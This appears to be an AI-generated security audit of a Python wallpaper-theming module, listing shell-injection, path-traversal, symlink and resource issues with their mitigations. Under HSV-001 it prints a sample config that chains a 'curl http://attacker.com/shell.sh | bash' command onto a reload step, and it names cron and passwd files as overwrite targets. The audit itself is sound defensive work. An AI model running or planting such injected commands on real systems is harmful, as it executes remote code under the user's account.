# Security Audit - Smart Selection Engine

**Audit Date:** 2025-12-30
**Auditor:** Claude Opus 4.5 (Security Auditor Mode)
**Scope:** Smart Selection Engine (`variety/smart_selection/`)
**Files Reviewed:**
- `database.py` (1249 lines)
- `selector.py` (726 lines)
- `palette.py` (536 lines)
- `theming.py` (977 lines)
- `indexer.py` (447 lines)
- `wallust_config.py` (229 lines)
- `models.py` (155 lines)
- `weights.py` (232 lines)
- `config.py` (67 lines)

---

## Executive Summary

The Smart Selection Engine demonstrates **good security practices overall**, with proper use of parameterized SQL queries, reasonable input validation, and appropriate error handling. However, several **medium and low severity issues** were identified, primarily around shell command injection risks in the theming engine, potential path traversal in backup operations, and race conditions in cache file discovery. No critical vulnerabilities that would allow immediate remote code execution or data exfiltration were found.

---

## Critical Vulnerabilities

**None identified.**

The codebase does not expose any network services, does not process untrusted remote input, and uses parameterized queries throughout the database layer.

---

## High Severity

### HSV-001: Shell Command Injection via Reload Commands (CVSS 7.8)

**File:** `theming.py`, lines 761-773
**Function:** `_run_reload_command()`

**Description:**
The theming engine executes reload commands using `shell=True` with command strings that could potentially be influenced by configuration files:

```python
def _run_reload_command(self, command: str, template_name: str) -> None:
    try:
        subprocess.run(
            command,
            shell=True,  # VULNERABILITY: Shell injection if command is user-controlled
            timeout=self.RELOAD_TIMEOUT,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
```

**Attack Vector:**
1. An attacker with write access to `~/.config/variety/theming.json` could inject a malicious reload command
2. The `reload_commands` section in theming.json is parsed at lines 656-660 and assigned to template configs
3. When a wallpaper changes, the malicious command executes with user privileges

**Example Malicious Config:**
```json
{
  "reload_commands": {
    "hyprland": "hyprctl reload; curl http://attacker.com/shell.sh | bash"
  }
}
```

**Mitigation:**
- Use `shell=False` with command arrays where possible
- Validate reload commands against an allowlist of safe patterns
- Document the security implications of custom reload commands
- Consider restricting reload commands to a predefined safe set

**Impact:** Local privilege escalation, arbitrary command execution with user privileges.

**CWE:** CWE-78 (Improper Neutralization of Special Elements used in an OS Command)

---

### HSV-002: Arbitrary File Write via Template Target Path (CVSS 7.5)

**File:** `theming.py`, lines 519-534, 711-752
**Functions:** `_load_templates()`, `_write_atomic()`

**Description:**
Template target paths are read from wallust.toml and user config, then used directly for file writes without adequate path validation:

```python
# Line 533: Path comes from config, only ~ expansion performed
target_path = os.path.expanduser(target_path)

# Line 711-752: Direct write to target_path
def _write_atomic(self, path: str, content: str) -> bool:
    parent_dir = os.path.dirname(path)
    if parent_dir:
        os.makedirs(parent_dir, exist_ok=True)  # Creates arbitrary directories
```

**Attack Vector:**
1. Attacker modifies `~/.config/wallust/wallust.toml` with a malicious target path
2. Example: `target = "/etc/cron.d/malicious"` or `target = "~/.bashrc"`
3. On next wallpaper change, the templated content (controlled by attacker) is written to the target

**Mitigations:**
- Restrict target paths to a configurable whitelist of directories (e.g., `~/.config/`, `~/.cache/`)
- Reject absolute paths or paths containing `..`
- Validate target paths are within expected application directories

**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

---

## Medium Severity

### MSV-001: Dynamic SQL Placeholder Construction (CVSS 5.5)

**File:** `database.py`, lines 556-559, 710-718, 1113-1121, 1233-1247

**Description:**
Several methods construct SQL queries with dynamically generated placeholder strings:

```python
# Line 556-559
placeholders = ','.join('?' * len(source_ids))
cursor.execute(
    f'SELECT * FROM sources WHERE source_id IN ({placeholders})',
    source_ids
)
```

**Analysis:**
While the actual values are properly parameterized (passed as the second argument), the placeholder count is derived from user-controlled list length. This pattern is **safe** because:
1. Only `?` characters are interpolated, not values
2. The values themselves are parameterized
3. SQLite validates parameter count matches placeholders

**Risk:** Minimal, but the pattern is fragile. If modified incorrectly, it could introduce SQL injection.

**Recommendation:**
- Add comments explaining why this pattern is safe
- Consider using SQLite's JSON functions for batch operations on modern SQLite versions

**CWE:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) - **Mitigated**

---

### MSV-002: TOCTOU Race in Cache File Discovery (CVSS 5.3)

**File:** `palette.py`, lines 392-410
**Function:** `extract_palette()`

**Description:**
The palette extractor uses timestamp-based cache file discovery that has a race condition window:

```python
# Line 392: Record time before running wallust
search_threshold = start_time - 1.0

# Lines 399-410: Search for recently modified cache files
for entry in os.listdir(cache_dir):
    entry_path = os.path.join(cache_dir, entry)
    if os.path.isdir(entry_path):
        for subfile in os.listdir(entry_path):
            if palette_type in subfile:
                filepath = os.path.join(entry_path, subfile)
                mtime = os.path.getmtime(filepath)
                # RACE: File could be modified between mtime check and read
                if mtime >= search_threshold and mtime > latest_time:
                    latest_time = mtime
                    latest_file = filepath

if latest_file:
    with open(latest_file, 'r') as f:  # TOCTOU: File may have changed
        json_data = json.load(f)
```

**Attack Vector:**
If multiple Variety instances or another process modifies wallust cache simultaneously, the wrong palette data may be returned. The code acknowledges this in comments (lines 369-391) but does not implement mitigations.

**Impact:** Incorrect palette data could be associated with wallpapers, affecting color-based selection accuracy. No security impact, but potential data integrity issue.

**CWE:** CWE-367 (Time-of-check Time-of-use Race Condition)

---

### MSV-003: Unsafe Path Concatenation in Backup (CVSS 5.0)

**File:** `database.py`, lines 972-1004
**Function:** `backup()`

**Description:**
The backup path is used without validation:

```python
def backup(self, backup_path: str) -> bool:
    with self._lock:
        try:
            backup_conn = sqlite3.connect(backup_path)  # Creates file at arbitrary path
            self.conn.backup(backup_conn)
            backup_conn.close()
```

**Attack Vector:**
If an attacker can influence the `backup_path` parameter (e.g., through a crafted config or API call), they could:
1. Write database content to arbitrary locations
2. Overwrite existing files
3. Create files in sensitive directories

**Current Protection:** The `backup_path` is currently only set from:
- `selector.py` line 421: `backup_path = self.db.db_path + '.backup'`
- `selector.py` line 718: Direct parameter from caller

**Recommendation:**
- Validate backup_path is within expected directories
- Add `os.path.realpath()` check to prevent symlink attacks
- Ensure backup_path doesn't contain path traversal sequences

**CWE:** CWE-22 (Path Traversal)

---

### MSV-004: Symlink Attack in Atomic Write (CVSS 5.0)

**File:** `theming.py`, lines 711-752
**Function:** `_write_atomic()`

**Description:**
The atomic write function uses `os.rename()` which follows symlinks on the target:

```python
def _write_atomic(self, path: str, content: str) -> bool:
    parent_dir = os.path.dirname(path)
    if parent_dir:
        os.makedirs(parent_dir, exist_ok=True)

    fd, temp_path = tempfile.mkstemp(dir=parent_dir)
    # ...
    os.rename(temp_path, path)  # VULNERABILITY: If path is a symlink, follows it
```

**Attack Vector:**
1. Attacker creates symlink at expected target path (e.g., `~/.config/hypr/colors.conf -> /etc/passwd`)
2. Template engine writes theme content through the symlink
3. Target file is overwritten with controlled content

**Mitigation:**
- Check if target path is a symlink before writing: `os.path.islink(path)`
- Use `os.open()` with `O_NOFOLLOW` flag for safer operations
- Resolve symlinks and validate resulting path is within allowed directories

**CWE:** CWE-59 (Improper Link Resolution Before File Access)

---

### MSV-005: Insufficient Input Validation on Hex Colors (CVSS 4.3)

**File:** `palette.py`, lines 25-42, `theming.py`, lines 33-47

**Description:**
Hex color parsing assumes well-formed input without validation:

```python
def hex_to_hsl(hex_color: str) -> Tuple[float, float, float]:
    hex_color = hex_color.lstrip('#')
    r = int(hex_color[0:2], 16) / 255.0  # IndexError if < 6 chars
    g = int(hex_color[2:4], 16) / 255.0
    b = int(hex_color[4:6], 16) / 255.0
```

**Attack Vector:**
Malformed hex color in wallust cache or palette data could cause:
1. `IndexError` if string is too short
2. `ValueError` if not valid hex

**Current Protection:** Exception handlers in `extract_palette()` (line 432-434) catch `ValueError`.

**Recommendation:**
- Add explicit validation regex: `^#?[0-9A-Fa-f]{6}$`
- Handle short strings gracefully

**CWE:** CWE-20 (Improper Input Validation)

---

### MSV-006: Unbounded Database Query Results (CVSS 4.0)

**File:** `database.py`, lines 375-384, 504-521
**Functions:** `get_all_images()`, `get_all_sources()`

**Description:**
These functions return all records without pagination:

```python
def get_all_images(self) -> List[ImageRecord]:
    with self._lock:
        cursor = self.conn.cursor()
        cursor.execute('SELECT * FROM images')
        return [self._row_to_image_record(row) for row in cursor.fetchall()]
```

**Impact:**
For large wallpaper collections (10,000+ images), this could:
1. Consume significant memory
2. Cause UI freezes
3. Potentially lead to memory exhaustion

**Recommendation:**
- Add optional `limit` parameter
- Implement generator-based iteration for large result sets
- Consider pagination for statistics/preview operations

**CWE:** CWE-400 (Uncontrolled Resource Consumption)

---

## Low Severity

### LSV-001: Insecure Temporary File in Parent Directory (CVSS 3.9)

**File:** `theming.py`, line 732
**Function:** `_write_atomic()`

**Description:**
Temporary files are created in the target's parent directory:

```python
fd, temp_path = tempfile.mkstemp(dir=parent_dir)
```

If the parent directory is world-writable (e.g., `/tmp`), another user could potentially:
1. Predict the temp file name pattern
2. Race to modify it before rename

**Mitigation:** Use `tempfile.NamedTemporaryFile()` with `delete=False` or ensure parent directories have restrictive permissions.

**CWE:** CWE-377 (Insecure Temporary File)

---

### LSV-002: Debug Information in Logs (CVSS 3.7)

**Files:** Multiple files
**Pattern:** Logger statements with file paths

**Description:**
Log messages include full file paths which could reveal sensitive information about system structure:

```python
# palette.py line 351
logger.debug(f"Image has insufficient color variety: {image_path}")

# theming.py line 769
logger.debug(f"Reload command succeeded for {template_name}")
```

**Impact:** If logs are exposed (e.g., through a log aggregation service or debug endpoints), file system structure is revealed.

**Recommendation:**
- Use relative paths in logs where possible
- Ensure debug logs are not enabled in production
- Redact sensitive path components

**CWE:** CWE-532 (Insertion of Sensitive Information into Log File)

---

### LSV-003: Missing Timeout on PIL Image.open() (CVSS 3.5)

**File:** `indexer.py`, lines 113-115
**Function:** `index_image()`

**Description:**
Opening images with PIL has no timeout:

```python
with Image.open(filepath) as img:
    width, height = img.size
```

**Attack Vector:**
A maliciously crafted image (e.g., a "zip bomb" decompression attack or slow-to-decode format) could cause denial of service during indexing.

**Mitigation:**
- Set `Image.MAX_IMAGE_PIXELS` to prevent decompression bombs
- Use multiprocessing with timeout for image parsing
- Implement file size limits before opening

**CWE:** CWE-400 (Uncontrolled Resource Consumption)

---

### LSV-004: Subprocess Timeout Values (CVSS 3.0)

**File:** `palette.py`, lines 334-346; `theming.py`, line 453

**Description:**
Fixed timeout values may be insufficient for slow systems:
- `palette.py`: 30 second timeout for wallust
- `theming.py`: 5 second timeout for reload commands

**Impact:** On slow systems or during high load, legitimate operations may timeout causing feature degradation.

**Recommendation:** Make timeouts configurable through SelectionConfig.

---

### LSV-005: No Size Limit on Template Files (CVSS 2.5)

**File:** `theming.py`, lines 695-698
**Function:** `_get_cached_template()`

**Description:**
Template files are read entirely into memory without size limits:

```python
with open(path, 'r', encoding='utf-8') as f:
    content = f.read()  # No size limit
```

**Impact:** A large template file could exhaust memory.

**Mitigation:** Add maximum file size check (e.g., 1MB limit for templates).

**CWE:** CWE-770 (Allocation of Resources Without Limits)

---

### LSV-006: Predictable Database Path (CVSS 2.0)

**Pattern:** Database is stored in `~/.config/variety/smart_selection.db`

**Description:**
The database location is predictable and world-readable by default on most systems.

**Impact:** Other local users could potentially read wallpaper selection history.

**Mitigation:** Ensure file permissions are set to 0600 after creation.

---

## Informational

### INF-001: Good Practice - Parameterized SQL Queries

All SQL operations use parameterized queries with `?` placeholders. Example:

```python
cursor.execute('SELECT * FROM images WHERE filepath = ?', (filepath,))
```

This effectively prevents SQL injection throughout the database layer.

### INF-002: Good Practice - Thread Safety with RLock

The `ImageDatabase` class uses `threading.RLock()` for all database operations, providing thread-safe access. The reentrant nature of RLock is appropriate for methods that may call other locked methods.

### INF-003: Good Practice - WAL Mode for Crash Resilience

```python
self.conn.execute("PRAGMA journal_mode=WAL")
```

WAL mode provides crash resilience and better concurrent performance.

### INF-004: Good Practice - Atomic File Writes

The `_write_atomic()` function uses temp file + rename pattern, which is POSIX-atomic and prevents partial writes.

### INF-005: Observation - Foreign Keys Not Enforced

The palettes table has `FOREIGN KEY (filepath) REFERENCES images(filepath) ON DELETE CASCADE`, but SQLite foreign keys are disabled by default. Add:
```python
self.conn.execute("PRAGMA foreign_keys = ON")
```

### INF-006: Observation - Global Singleton Pattern

`wallust_config.py` uses a global singleton with double-checked locking. While this works, consider using a context manager or dependency injection for testability.

### INF-007: Documentation - Security Implications of External Commands

The theming engine executes external commands (wallust, reload commands). Document:
1. Which commands are executed
2. With what privileges
3. Security implications of custom reload commands

---

## Threat Model Considerations

### Attack Surface Analysis

1. **Local File System (Primary)**
   - Configuration files (`wallust.toml`, `theming.json`)
   - Template files
   - Image files (indexed and processed)
   - Database file
   - Cache directories

2. **External Processes**
   - wallust binary (color extraction)
   - Reload commands (window managers, applications)
   - PIL/Pillow (image parsing)

3. **User Interaction**
   - D-Bus API (not in scope but integration point)
   - GUI preferences (not in scope)

### Trust Boundaries

```
+------------------+     +----------------------+
|   User Config    |---->|  Smart Selection     |
|  (wallust.toml,  |     |       Engine         |
|  theming.json)   |     +----------------------+
+------------------+              |
                                  v
+------------------+     +----------------------+
|   Image Files    |---->|   PIL/Pillow         |
| (from downloads) |     |   Image Parser       |
+------------------+     +----------------------+
                                  |
                                  v
+------------------+     +----------------------+
| wallust Binary   |<----|  Palette Extractor   |
+------------------+     +----------------------+
                                  |
                                  v
+------------------+     +----------------------+
| Reload Commands  |<----|  Theme Engine        |
+------------------+     +----------------------+
```

### Threat Actors

1. **Local User (Trusted):** User configuring their own installation
2. **Other Local Users:** Users on shared systems (limited threat)
3. **Malicious Images:** Downloaded from untrusted sources
4. **Compromised Config:** Via separate vulnerability or social engineering

### Security Recommendations Summary

| Priority | Recommendation |
|----------|----------------|
| High | Validate/sanitize reload commands in theming.json |
| High | Restrict template target paths to allowed directories |
| Medium | Add symlink checks before file writes |
| Medium | Implement file size limits for templates |
| Medium | Add explicit hex color validation |
| Low | Configure timeouts in SelectionConfig |
| Low | Set restrictive file permissions on database |

---

## Conclusion

The Smart Selection Engine is well-designed from a security perspective, with no critical vulnerabilities and proper use of parameterized SQL queries. The main areas of concern are:

1. **Shell command execution** in the theming engine that could be exploited via configuration file manipulation
2. **File path handling** that could allow writes to unintended locations
3. **Race conditions** in cache file discovery (acknowledged in code comments)

These issues are primarily exploitable by an attacker who already has write access to the user's configuration files, which significantly limits the attack surface. The recommendations provided would further harden the application against edge cases and defense-in-depth scenarios.

---

*Generated with Claude Code Security Auditor*
*CVSS scores are estimates based on attack complexity and impact*
